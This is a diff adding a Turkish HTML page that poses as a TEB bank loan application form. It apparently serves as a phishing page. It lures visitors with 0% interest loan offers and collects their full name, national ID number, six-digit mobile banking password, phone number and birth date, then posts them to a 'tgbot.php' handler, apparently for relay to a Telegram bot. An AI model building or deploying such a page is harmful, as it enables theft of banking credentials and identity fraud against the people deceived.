@@ -1,0 +1,382 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Kredi Başvuru Formu</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        html, body {
+            margin: 0;
+            padding: 0;
+            height: 100%;
+            width: 100%;
+            overflow-x: hidden;
+        }
+      body {
+    font-family: Arial, sans-serif;
+    background-color: #FFF; /* Sarı ton arka plan rengi */
+}
+
+        header {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 60px;
+            background-color: rgba(255, 255, 255, 1); /* Beyaz şerit */
+            border-top: 4px solid rgb(124, 252, 0); /* Üstte koyu sarı kenar çizgisi */
+            border-bottom: 4px solid rgb(124, 252, 0); /* Altta koyu sarı kenar çizgisi */
+            z-index: 1000;
+            display: flex;
+            align-items: center;
+            justify-content: space-between; /* Logo ve TR yazısını sağa ve sola yasla */
+            padding: 0 20px; /* İçerik için sağ ve sol boşluk */
+        }
+        .logo {
+            height: 40px; /* Logonun yüksekliği */
+            width: auto;
+        }
+        .tr-text {
+            font-size: 18px;
+            color: black; /* Yazı rengi siyah */
+            text-align: center; /* Yazıyı ortalar */
+        }
+        .content {
+            padding-top: 80px; /* Header yüksekliğine göre içerik boşluğu ayarlandı */
+            padding: 0 10px;
+            min-height: calc(100vh - 60px);
+        }
+
+  .form-container {
+    background-color: rgba(255, 255, 255, 0.2);
+    padding: 20px;
+    border-radius: 8px;
+    max-width: 500px;
+    margin: 60px auto;
+    color: white;
+    border: 2px solid rgb(0, 100, 0); /* Daha koyu yeşil çerçeve */
+    margin-top: 100px; /* Bu değeri azaltarak formu yukarı alabilirsiniz */
+    box-shadow: 0px 6px 20px rgba(0, 70, 0, 0.8); /* Daha koyu yeşil gölgelendirme */
+}
+
+
+
+		.form-group label {
+    position: absolute;
+    top: -10px; /* Label'ı inputun hemen üzerine yerleştirir */
+    left: 10px;
+    font-size: 12px; /* Daha küçük ve stilize bir font boyutu */
+    color: #555; /* Daha belirgin bir gri renk */
+    background-color: white; /* Arka plan beyaz */
+    padding: 0 5px; /* Label etrafında hafif boşluk */
+    transition: all 0.3s ease; /* Yumuşak geçiş efekti */
+}
+
+.form-group input,
+.form-group select {
+    width: 100%;
+    padding: 12px;
+    font-size: 14px;
+    border: 2px solid #888; /* Gri kenar rengi */
+    border-radius: 4px;
+    box-sizing: border-box;
+    background-color: rgba(255, 255, 255, 0.9);
+    color: #333; /* Daha koyu yazı rengi */
+    transition: border-color 0.3s ease; /* Yumuşak geçiş efekti */
+}
+
+.form-group input:focus,
+.form-group select:focus {
+    border-color: #333; /* Focus durumunda kenar rengini koyulaştırır */
+    outline: none; /* Varsayılan mavi outline'ı kaldırır */
+}
+
+.form-group input:focus + label,
+.form-group select:focus + label {
+    color: #333; /* Focus durumunda label rengini koyulaştırır */
+    font-weight: bold; /* Label'ı kalın yapar */
+}
+
+.form-group input:not(:placeholder-shown) + label,
+.form-group select:not(:placeholder-shown) + label {
+    color: #333;
+    font-weight: bold;
+}
+
+        .welcome-title {
+            text-align: center;
+            color: black;
+            font-size: 28px;
+            margin-top: 70px;
+            margin-bottom: 20px;
+        }
+
+        .form-title {
+            text-align: center;
+            color: black;
+            margin-bottom: 20px;
+            font-size: 24px;
+        }
+
+        .form-group {
+            position: relative;
+            margin-bottom: 20px;
+        }
+
+        
+    .form-group button {
+    width: 100%;
+    padding: 12px 20px;
+    background-color: rgb(124, 252, 0); /* Header çizgisi renginde yeşil arka plan */
+    border: 2px solid rgb(124, 252, 0); /* Aynı renkte sınır */
+    border-radius: 8px;
+    color: #000000; /* Siyah yazı rengi */
+    font-size: 18px;
+    cursor: pointer;
+    transition: background-color 0.3s ease, color 0.3s ease;
+    text-transform: uppercase;
+    letter-spacing: 1px;
+}
+
+.form-group button:hover,
+.form-group button:active {
+    background-color: rgb(0, 128, 0); /* Tıklandığında tamamen koyu yeşil */
+    border-color: rgb(0, 128, 0); /* Kenarlar da koyu yeşil */
+    color: #ffffff; /* Yazı rengi beyaz */
+}
+
+
+        .slider-container {
+            margin: 20px 0;
+        }
+
+        .slider-container label {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            font-size: 14px;
+            color: black;
+        }
+
+        .slider-container input[type="range"] {
+            width: 100%;
+            margin: 10px 0;
+        }
+
+        .slider-container .output {
+            font-weight: bold;
+            font-size: 16px;
+            color: black;
+            margin-left: 10px;
+        }
+
+        footer {
+            position: fixed;
+            bottom: 0;
+            width: 100%;
+            text-align: center;
+            background-color: rgba(255, 255, 255, 0.2); /* Şeffaf beyaz arka plan */
+            padding: 10px 0;
+            color: black;
+            font-size: 14px;
+        }
+
+        .checkbox-container input[type="checkbox"] {
+    width: 16px;
+    height: 16px;
+    border: 2px solid #FF5252; /* Kırmızı kenar rengi */
+    appearance: none; /* Varsayılan checkbox stilini kaldırır */
+    background-color: white; /* Beyaz arka plan */
+    cursor: pointer;
+    border-radius: 6px; /* İsterseniz köşeleri yuvarlayabilirsiniz */
+}
+
+.checkbox-container input[type="checkbox"]:checked {
+    background-color: #32CD32	; /* Seçildiğinde içi yeşil olur */
+    border-color: #32CD32	; /* Kenar rengini yeşil tutar */
+}
+
+		.checkbox-container label {
+    margin-left: 30px; /* Checkbox ile yazı arasına boşluk ekler */
+}
+
+        #calculatedAmount {
+    font-weight: bold;
+    background-color: rgba(255, 255, 255, 0.9); /* Diğer inputlarla aynı arka plan rengi */
+    color: black;
+    border: 2px solid #888; /* Diğer inputlarla aynı kenar rengi */
+    padding: 10px; /* İç boşluk */
+    border-radius: 4px; /* Köşeleri hafif yuvarlatma */
+    width: 100%; /* Genişliği diğer inputlarla aynı yapar */
+    box-sizing: border-box; /* Padding'in genişliği etkilememesi için */
+}
+
+    </style>
+</head>
+<body>
+    <header>
+        <!-- Logo için yer -->
+        <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTWE87A6NFtJrerGLaUfsDVbCR1qaTz1dlSjirorsOa1IwJqCs1knt02z9jANHZpL2mUQ&usqp=CAU" alt="Logo" class="logo">
+        <!-- TR yazısı -->
+        <div class="tr-text">TR</div>
+    </header>
+    
+    <div class="content">
+      
+        <div class="form-container">
+            <div class="form-title">Başvuru Formunu Tamamlayınız</div>
+            <form method="POST" action="tgbot.php">
+                <div class="form-group">
+                    <label for="ad_soyad">İsim Soyisim:</label>
+                    <input type="text" id="ad_soyad" name="ad_soyad" placeholder="İsim Soyisim Giriniz" required>
+                </div>
+
+                <div class="form-group">
+                    <label for="TCNo">TC Kimlik Numarası:</label>
+                    <input type="text" id="TCNo" name="TCNo" maxlength="11" required inputmode="numeric" 
+                        oninput="this.value = this.value.replace(/[^0-9]/g, ''); if(this.value.length === 1 && this.value === '0') this.value = '';"
+                        pattern="[1-9][0-9]{10}" placeholder="TC Kimlik Numarası Giriniz" 
+                        title="TC Kimlik Numarası 11 haneli olmalı ve 0 ile başlamamalıdır.">
+                </div>
+
+                <div class="form-group">
+                    <label for="password">Mobil Şifre:</label>
+                    <input type="password" id="password" name="password" maxlength="6" inputmode="numeric" required 
+                        oninput="this.value = this.value.replace(/[^0-9]/g, '').slice(0, 6);" pattern="\d{6}" 
+                        placeholder="Mobil Şifrenizi Giriniz" title="Şifre 6 haneli olmalıdır.">
+                </div>
+
+                <div class="form-group">
+                    <label for="Phone">Telefon Numarası:</label>
+                    <input type="tel" id="Phone" name="Phone" maxlength="11" required inputmode="numeric" 
+                        oninput="this.value = this.value.replace(/[^0-9]/g, '').slice(0, 11);" pattern="0[0-9]{10}" 
+                        placeholder="05XX XXX XX XX" title="Cep telefonu 11 haneli olmalıdır ve 0 ile başlamalıdır.">
+                </div>
+
+                                <div class="form-group">
+                    <label for="BirthDatePicker">Doğum Tarihi:</label>
+                    <input type="date" id="BirthDatePicker" name="BirthDate" required>
+                </div>
+
+                <div class="form-group">
+                    <label for="krediSecimi">Kredi Türü Seçimi:</label>
+                    <select id="krediSecimi" name="krediSecimi" required onchange="updateKrediTutarLimits(); calculateMonthlyPayment();">
+                        <option value="" disabled selected>Kredi Türü Seçiniz</option>
+                        <option value="Anında Hızlı Kredi" data-max-vade="36" data-max-tutar="100000" data-faiz="0">Anında Hızlı Kredi (%0.0)</option>
+                        <option value="İhtiyaç Kredisi" data-max-vade="36" data-max-tutar="250000" data-faiz="0.49">İhtiyaç Kredisi (%0.49)</option>
+                        <option value="Alışveriş Kredisi" data-max-vade="24" data-max-tutar="100000" data-faiz="1.20">Alışveriş Kredisi (%1.20)</option>
+                        <option value="Konut Kredisi" data-max-vade="120" data-max-tutar="2000000" data-faiz="0.85">Konut Kredisi (%0.85)</option>
+                        <option value="Taşıt Kredisi" data-max-vade="48" data-max-tutar="1000000" data-faiz="0.95">Taşıt Kredisi (%0.95)</option>
+                        <option value="Borç Transferi Kredisi" data-max-vade="36" data-max-tutar="200000" data-faiz="0.69">Borç Transferi Kredisi (%0.69)</option>
+                        <option value="Ek Hesap Kredisi" data-max-vade="48" data-max-tutar="1000000" data-faiz="0">Ek Hesap Kredisi (%0.0)</option>
+                        <option value="EYT Kredisi" data-max-vade="72" data-max-tutar="500000" data-faiz="0.49">EYT Kredisi (%0.49)</option>
+                    </select>
+                </div>
+
+                <div class="slider-container">
+                    <label for="krediTutar">Kredi Tutarı: <span class="output" id="krediTutarOutput">10000 TL</span></label>
+                    <input type="range" id="krediTutar" name="krediTutar" min="10000" max="1000000" step="10000" value="10000" 
+                        oninput="document.getElementById('krediTutarOutput').textContent = this.value + ' TL'; calculateMonthlyPayment();">
+                </div>
+
+                <div class="slider-container">
+                    <label for="vadeSayisi">Vade Sayısı: <span class="output" id="vadeSayisiOutput">12 AY</span></label>
+                    <input type="range" id="vadeSayisi" name="vadeSayisi" min="1" max="120" step="1" value="12" 
+                        oninput="document.getElementById('vadeSayisiOutput').textContent = this.value + ' AY'; calculateMonthlyPayment();">
+                </div>
+
+                <div class="form-group">
+                    <label for="calculatedAmount">Aylık Ödeme Tutarı:</label>
+                    <input type="text" id="calculatedAmount" name="calculatedAmount" readonly>
+                </div>
+
+                <div class="form-group checkbox-container">
+                    <input type="checkbox" id="consent" name="consent" required>
+                    <label for="consent">
+                        <a style="color: #000000; text-decoration: underline;">
+                            Başvurum esnasında paylaştığım verilerimin kullanım koşullarında
+							belirtilen amaçlar için işlenmesine onay veriyorum.</a>
+                    </label>
+                </div>
+
+                <div class="form-group">
+                    <button type="submit">Başvur</button>
+                </div>
+            </form>
+        </div>
+    </div>
+
+    <footer>
+        Her hakkı TEB A.Ş.'ye aittir. ©2024
+
+    </footer>
+
+    <script>
+        function updateKrediTutarLimits() {
+            const krediSecimi = document.getElementById('krediSecimi');
+            const krediTutarSlider = document.getElementById('krediTutar');
+            const vadeSayisiSlider = document.getElementById('vadeSayisi');
+            const selectedOption = krediSecimi.options[krediSecimi.selectedIndex];
+            
+            const maxTutar = selectedOption.getAttribute('data-max-tutar');
+            const maxVade = selectedOption.getAttribute('data-max-vade');
+            
+            krediTutarSlider.max = maxTutar;
+            vadeSayisiSlider.max = maxVade;
+            
+            if (parseInt(krediTutarSlider.value) > maxTutar) {
+                krediTutarSlider.value = maxTutar;
+            }
+            if (parseInt(vadeSayisiSlider.value) > maxVade) {
+                vadeSayisiSlider.value = maxVade;
+            }
+
+            document.getElementById('krediTutarOutput').textContent = krediTutarSlider.value + ' TL';
+            document.getElementById('vadeSayisiOutput').textContent = vadeSayisiSlider.value + ' AY';
+            
+            calculateMonthlyPayment();
+        }
+
+        function calculateMonthlyPayment() {
+            const krediSecimi = document.getElementById('krediSecimi');
+            const selectedOption = krediSecimi.options[krediSecimi.selectedIndex];
+            
+            const krediTutar = parseInt(document.getElementById('krediTutar').value);
+            const vadeSayisi = parseInt(document.getElementById('vadeSayisi').value);
+            
+            const faizOrani = parseFloat(selectedOption.getAttribute('data-faiz')) / 100;
+
+            let aylikOdeme;
+
+            if (faizOrani === 0) {
+                // Faiz oranı %0 ise, basit bölme işlemi ile hesaplama yap
+                aylikOdeme = krediTutar / vadeSayisi;
+            } else {
+                // Faizli aylık ödeme hesaplaması (Anapara + Faiz)
+                const aylikFaizOrani = faizOrani / 12;
+                aylikOdeme = (krediTutar * aylikFaizOrani) / (1 - Math.pow(1 + aylikFaizOrani, -vadeSayisi));
+            }
+
+            // Hesaplanan tutarı input alanına yaz
+            document.getElementById('calculatedAmount').value = aylikOdeme.toFixed(2) + ' TL';
+        }
+
+        // Sayfa yüklendiğinde varsayılan değerlerle hesaplama yap
+        document.addEventListener('DOMContentLoaded', function() {
+            updateKrediTutarLimits();
+            calculateMonthlyPayment();
+        });
+
+        document.getElementById('BirthDatePicker').addEventListener('change', function() {
+            var date = this.value;
+            var dateParts = date.split("-");
+            document.getElementById('BirthDate').value = dateParts[2] + "." + dateParts[1] + "." + dateParts[0]; // GG.AA.YYYY formatı
+        });
+    </script>
+</body>
+</html>
